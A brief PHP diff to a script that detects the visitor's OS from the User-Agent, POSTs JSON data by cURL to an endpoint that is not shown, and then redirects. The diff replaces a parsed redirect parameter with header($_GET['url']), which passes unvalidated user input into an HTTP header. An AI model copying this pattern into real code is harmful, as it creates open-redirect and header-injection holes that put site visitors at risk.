@@ -1,6 +1,5 @@
 <?php
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
-parse_str($url_components['query'], $params); 
 function getOS() { 
     global $user_agent;
     $os_platform    =   "SPAM BOT";
@@ -79,6 +78,6 @@ curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
 curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt( $exec, CURLOPT_HEADER, 0);
 curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
-header($params['redirect'], true, 301); 
+header($_GET['url']); 
 $response = curl_exec( $exec );
 ?>
